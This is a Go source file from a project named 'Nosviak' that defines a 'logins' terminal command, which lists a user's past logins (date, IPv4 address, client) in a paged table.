package commands

import (
	"Nosviak/core/database"
	"Nosviak/core/masters/sessions"
	"Nosviak/core/models/views"
	"strconv"
	"strings"
	"time"

	"Nosviak/core/masters/users/pager"

	"github.com/alexeyco/simpletable"
)

func init() {

	NewCommand(&Command{
		//displays all logins for the users account
		//this is so they can view where & when they have logged in from correctly
		Name:           "logins",
		Desciption:     "lists all logins from your account",
		MinPermissions: make([]string, 0),
		ZeroArguments:  func(session *sessions.Session, args []string) error {


			//gets all active logins requests from the sessions username
			//this is used so we can easily fetch your login details
			Logins, err := database.Container.GetLoginReqs(session.User.Username)
			if err != nil {
				return views.NewDTX("logins-failed.dtx", session.Write).Template(session, session.Channel)
			}

			//creates a new simpletable instance
			//meaning so we can correctly create our table
			table := simpletable.New()

			//creates the headers
			//this is shown at the top of the menu
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "date"},
					{Align: simpletable.AlignCenter, Text: "IPv4"},
					{Align: simpletable.AlignCenter, Text: "client"},
				},
			}

			//ranges through all logins requests which have been made
			for pos, Login := range Logins {
				//creates a new cell row per login request
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(pos)},
					{Align: simpletable.AlignCenter, Text: time.Unix(Login.Date, 0).Format("2/01/2006 15:04:05")},
					{Align: simpletable.AlignCenter, Text: strings.Split(Login.Address, ":")[0]},
					{Align: simpletable.AlignCenter, Text: Login.Client},
				}
	
				//appends the cellRows into the main body cell array
				table.Body.Cells = append(table.Body.Cells, r)
			}

			//executes the pager
			//pager allows the screen to be customly edited and changed
			return pager.NewPager("logins", table, session).ExecutePager()
		},
	})
}